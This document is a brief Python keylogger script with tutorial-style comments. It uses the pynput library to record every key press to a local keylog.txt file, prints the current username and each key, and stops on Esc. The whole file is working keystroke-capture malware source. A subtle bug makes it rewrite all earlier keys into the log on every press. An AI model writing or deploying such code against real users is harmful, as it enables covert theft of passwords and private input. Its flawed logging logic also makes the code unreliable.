import getpass  # Import getpass module to get current user
from pynput.keyboard import Key, Listener  

# Print who is logged in
current_user = getpass.getuser()
print(f"Logged in user: {current_user}")

# creating an empty list to store pressed keys  
the_keys = []  

# creating a function that defines what to do on each key press  
def functionPerKey(key):  
    # appending each pressed key to a list  
    the_keys.append(key)  
    # writing list to file after each key pressed  
    storeKeysToFile(the_keys)  
    # display pressed key (optional)
    print(f"Key pressed: {key}")  

# defining the function to write keys to the log file  
def storeKeysToFile(keys):  
    # creating the keylog.txt file with append mode  
    with open('keylog.txt', 'a') as log:  
        # looping through each key present in the list of keys  
        for the_key in keys:  
            # converting the key to string and removing the quotation marks  
            the_key = str(the_key).replace("'", "")  
            # writing each key to the keylog.txt file  
            log.write(the_key + ' ')  # add a space to separate keys  
        # Add a new line after each batch of keys (optional)
        log.write('\n')

# defining the function to perform operation on each key release  
def onEachKeyRelease(the_key):  
    # In case the key is "Esc", then stopping the keylogger  
    if the_key == Key.esc:  
        return False  

# Start the listener  
with Listener(  
    on_press=functionPerKey,  
    on_release=onEachKeyRelease  
) as the_listener:  
    the_listener.join()  # Correct indentation for joining the listener
